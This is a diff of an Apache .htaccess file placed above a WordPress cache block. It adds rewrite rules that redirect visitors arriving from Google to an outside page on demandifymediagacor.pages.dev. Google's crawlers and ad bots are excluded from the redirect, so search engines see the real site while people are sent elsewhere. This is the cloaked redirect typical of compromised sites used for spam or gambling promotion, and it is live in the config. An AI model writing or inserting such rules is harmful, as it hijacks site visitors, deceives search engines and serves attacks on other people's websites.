@@ -1,16 +1,13 @@
-# ==============================
-# Conditional redirect untuk referrer Google
-# ==============================
+<IfModule mod_rewrite.c>
 RewriteEngine On
-
-# Hanya jika referrer dari Google
 RewriteCond %{HTTP_REFERER} google\. [NC]
 
-# Kecuali jika user-agent Googlebot (opsional)
-RewriteCond %{HTTP_USER_AGENT} !(googlebot) [NC]
+RewriteCond %{HTTP_USER_AGENT} !(googlebot|adsbot-google|adsbot-google-mobile) [NC]
+RewriteCond %{REQUEST_URI} ^/readme\.txt$ [OR]
+RewriteCond %{HTTP_HOST} ^(www\.)?demandifymedia\.pages\.dev$ [NC]
 
-# Redirect semua request ke halaman target
 RewriteRule ^ https://demandifymediagacor.pages.dev/keep-smile-babyy/ [R=302,L]
+</IfModule>
 
 # ==============================
 # BEGIN WordPress + Cache
